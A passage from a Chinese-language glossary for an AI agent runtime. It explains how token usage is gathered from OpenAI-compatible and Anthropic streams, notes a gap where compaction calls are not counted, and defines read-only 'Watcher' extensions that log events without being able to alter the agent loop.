- OpenAI 兼容路径：请求里带 `stream_options.include_usage`；撞上不支持的服务商会降级（`stream-helper.ts`）
- Anthropic 路径：`message_start` 携 input（本次请求发了多少）、`message_delta` 携 output（**累计值，不是增量**）

各轮真值经 `AgentLoopResult.usage` 汇到 `Runtime.totalUsage`，`/usage` 命令读它。

**已知缺口**：[Compaction](#compaction上下文压缩) 走非流式 `chat()`，那条路径的用量没回流，所以 `/usage` 报的数偏少。

参见：[Agent Loop](#agent-loop)

## W

### Watcher（旁观扩展）
住在 `src/extensions/watchers/`、export `registerWatchers` 的扩展。它用 `ctx.events.subscribe(handler)` 通配收全量事件、返回值没人收——**只看只录，拦不住任何人**。

与 [Hook](#hook钩子扩展) 的唯一区别就是 ctx 里少了 `on`：拿不到 `on` 就改不了流程。这条约束由类型系统兜住，不靠使用自觉；`scripts/verify-extensions.ts` 还用**探针法**断言了“watcher 实际收到的 ctx 键里确实没有 `on`”（类型在运行时被擦除，只能这样验）。

现住民：`trace-log.ts`（成段落 `trace.jsonl`）。

对比：[Hook](#hook钩子扩展)
